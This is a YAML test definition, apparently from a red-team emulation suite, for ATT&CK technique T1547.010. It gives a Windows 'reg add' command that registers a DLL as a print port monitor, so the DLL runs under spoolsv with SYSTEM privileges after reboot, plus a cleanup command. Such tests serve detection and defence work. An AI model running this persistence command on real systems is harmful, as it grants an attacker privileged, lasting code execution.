- id: d4969a5c-9b0b-5b4c-b9de-3599132f9f63
  name: Soumaia ART Tests - Add Port Monitor persistence in Registry
  description: Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege. (requires elevation)
  tactic: privilege-escalation
  technique:
    attack_id: T1547.010
    name: 'Boot or Logon Autostart Execution: Port Monitors'
  platforms:
    windows:
      cmd:
        command: |-
          reg add "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /v "Driver" /d "$.\PortMonitor.dll" /t REG_SZ /f
        cleanup: |-
          reg delete "hklm\system\currentcontrolset\control\print\monitors\AtomicRedTeam" /f >nul 2>&1
        payloads:
        - PortMonitor.dll
